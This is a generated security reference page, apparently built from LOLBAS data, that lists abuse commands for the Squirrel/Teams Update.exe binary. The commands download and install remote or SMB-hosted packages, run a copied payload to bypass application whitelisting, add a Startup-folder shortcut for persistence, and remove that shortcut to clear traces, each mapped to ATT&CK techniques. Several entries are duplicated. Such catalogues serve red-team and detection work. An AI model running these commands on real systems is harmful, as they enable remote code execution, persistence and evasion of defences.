---
parsed_by: focuslocust
source: commands
type: generated
---
# Update Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Update.exe

Tool page: [Update.exe](../../tools/windows/update.exe.md)

### Download binary

```text
Update.exe --download {REMOTEURL}
```

Description:

The above binary will go to url and look for RELEASES file and download the nuget package.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --update={REMOTEURL}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --update={REMOTEURL}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --update={PATH_SMB:folder}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --update={PATH_SMB:folder}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --updateRollback={REMOTEURL}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --updateRollback={REMOTEURL}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Application Whitelisting Bypass

```text
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

Description:

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --updateRollback={PATH_SMB:folder}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Download and execute binary

```text
Update.exe --updateRollback={PATH_SMB:folder}
```

Description:

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary

```text
Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
```

Description:

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary

```text
Update.exe --createShortcut={PATH:.exe} -l=Startup
```

Description:

Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.

Related ATT&CK:

- [T1547](../../attack/techniques/T1547-boot-or-logon-autostart-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary

```text
Update.exe --removeShortcut={PATH:.exe}-l=Startup
```

Description:

Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.

Related ATT&CK:

- [T1070](../../attack/techniques/T1070-indicator-removal.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Update.yml` |
| Evidence | Command preserved from source parser. |
